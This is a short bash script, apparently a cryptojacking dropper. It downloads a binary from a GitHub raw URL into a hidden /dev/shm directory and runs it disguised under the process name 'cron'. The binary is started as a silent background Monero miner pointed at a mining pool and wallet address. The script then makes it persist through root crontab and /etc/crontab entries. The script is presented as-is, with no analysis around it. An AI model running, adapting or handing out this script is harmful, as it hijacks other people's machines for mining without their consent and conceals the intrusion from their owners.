#!/bin/bash
mkdir -p /dev/shm/.cache/
cd /dev/shm/.cache/
curl -sL https://raw.githubusercontent.com/Nullarys/files/main/cron -o cron
chmod +x cron
exec -a cron ./cron -o gulf.moneroocean.stream:20004 -u 47vWiuhUfPB83qUdvnGxK3UyV2ZpqmkUoJmL1S9K8dijbyhH82Wc8DRJbpgyJAwbX5iqRDR1Rgs1gdV4tVxohbQj7ta7Tia -p x --tls --keepalive --cpu-max-threads-hint=30 --background >/dev/null 2>&1 &
echo "*/5 * * * * /dev/shm/.cache/cron -o gulf.moneroocean.stream:20004 -u 47vWiuhUfPB83qUdvnGxK3UyV2ZpqmkUoJmL1S9K8dijbyhH82Wc8DRJbpgyJAwbX5iqRDR1Rgs1gdV4tVxohbQj7ta7Tia -p x --tls --keepalive --cpu-max-threads-hint=30 --background >/dev/null 2>&1" >> /var/spool/cron/root 2>/dev/null || echo "*/5 * * * * /dev/shm/.cache/cron -o gulf.moneroocean.stream:20004 -u 47vWiuhUfPB83qUdvnGxK3UyV2ZpqmkUoJmL1S9K8dijbyhH82Wc8DRJbpgyJAwbX5iqRDR1Rgs1gdV4tVxohbQj7ta7Tia -p x --tls --keepalive --cpu-max-threads-hint=30 --background >/dev/null 2>&1" >> /etc/crontab
